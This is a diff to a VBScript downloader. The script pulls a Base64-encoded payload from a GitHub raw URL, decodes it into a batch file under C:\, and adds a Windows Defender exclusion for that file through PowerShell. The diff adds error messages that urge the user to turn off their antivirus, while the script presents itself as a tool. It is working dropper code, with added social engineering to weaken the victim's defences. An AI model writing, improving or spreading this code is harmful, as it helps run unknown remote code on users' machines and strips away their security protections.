@@ -24,16 +24,24 @@ End If
 encodedFileUrl = "https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/encoded.txt"
 decodedFilePath = "C:\decoded.bat"
 
+' Error handling wrapper
+On Error Resume Next
+
 ' Create XMLHTTP object to fetch the file
 Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
 objXMLHTTP.Open "GET", encodedFileUrl, False
 objXMLHTTP.Send
 
+If Err.Number <> 0 Then
+    MsgBox "Error: Failed to create XMLHTTP object or send request. " & vbCrLf & "Blocking Detected! Try turning off your antivirus, the tool may not work!", vbCritical, "Error"
+    WScript.Quit
+End If
+
 ' Check if the request was successful
 If objXMLHTTP.Status = 200 Then
     ' Get the Base64 encoded content from the response
     encodedContent = objXMLHTTP.responseText
-    
+
     ' Decode the Base64 string
     Set objXML = CreateObject("MSXML2.DOMDocument")
     Set objNode = objXML.createElement("tmp")
@@ -50,7 +58,7 @@ If objXMLHTTP.Status = 200 Then
     On Error Resume Next
     objShell.Run "powershell -Command Add-MpPreference -ExclusionPath " & Chr(34) & decodedFilePath & Chr(34), 0, True
     If Err.Number <> 0 Then
-        MsgBox "Error adding exclusion: " & Err.Description
+        MsgBox "Error: Unable to add exclusion. " & vbCrLf & "Blocking Detected! Try turning off your antivirus, the tool may not work!", vbCritical, "Error"
         Err.Clear
     End If
     On Error GoTo 0
@@ -65,5 +73,5 @@ If objXMLHTTP.Status = 200 Then
     objFSO.DeleteFile(decodedFilePath)
 Else
     ' Handle failure in downloading the file
-    MsgBox "Failed to download the encoded file."
+    MsgBox "Error: Failed to download the encoded file. " & vbCrLf & "Blocking Detected! Try turning off your antivirus, the tool may not work!", vbCritical, "Error"
 End If
